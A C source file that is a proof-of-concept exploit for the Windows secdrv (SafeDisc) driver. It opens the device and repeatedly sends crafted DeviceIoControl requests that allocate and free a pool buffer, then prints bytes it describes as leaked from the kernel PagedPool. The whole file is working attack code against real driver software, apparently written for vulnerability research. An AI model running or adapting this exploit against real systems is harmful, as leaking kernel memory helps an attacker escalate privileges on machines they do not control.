
#include "stdafx.h"
#include <Windows.h>

#define DEVICE_NAME L"\\\\.\\secdrv"
#define IO_CONTROL_CODE 0x0CA002813


int main()
{
	HANDLE hDevice;
	PDWORD pdwInBuffer;
	PDWORD pdwOutBuffer;
	DWORD bytesReturned;

	hDevice = CreateFileW(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[*] Cannot open device, error code 0x%x\n", GetLastError());
		return 0;
	}
	else
	{
		printf("[*] Device %ws opened successfuly\n", DEVICE_NAME);
	}

	pdwInBuffer = (PDWORD)malloc(0x30);
	pdwOutBuffer = (PDWORD)malloc(0x30);

	printf("[*] Input Buffer at 0x%x\n", pdwInBuffer);
	printf("[*] Starting to leak words from the PagedPool: \n\n");

	for(size_t i = 0; i < 0x1000; i++)
	{
		memset(pdwInBuffer, 0, 0x30);
		memset(pdwOutBuffer, 0, 0x30);

		pdwInBuffer[0] = 0x1337;
		pdwInBuffer[3] = 0x10; // offset 0xC
		pdwInBuffer[1] = 0x96; // offset 0x4
		pdwInBuffer[4] = 0xAAAAAAAA; // offset 0x10

		pdwInBuffer[0] = 0x1337 + i;

		DeviceIoControl(hDevice,
						IO_CONTROL_CODE,
						pdwInBuffer,
						0x10,
						pdwOutBuffer,
						0x10,
						&bytesReturned,
						NULL);

		printf("%02x%02x ", *(((PBYTE)pdwInBuffer) + 0x10 + 0x12), *(((PBYTE)pdwInBuffer) + 0x10 + 0x13));

		// free the allocation
		pdwInBuffer[1] = 0x98; // offset 0x4

		DeviceIoControl(hDevice,
			IO_CONTROL_CODE,
			pdwInBuffer,
			0x10,
			pdwOutBuffer,
			0x10,
			&bytesReturned,
			NULL);

		// sleeping in order to hopfully make the allocation be on a different address and leak different data
		Sleep(500);
	}

	free(pdwInBuffer);
	free(pdwOutBuffer);

	return 0;
}
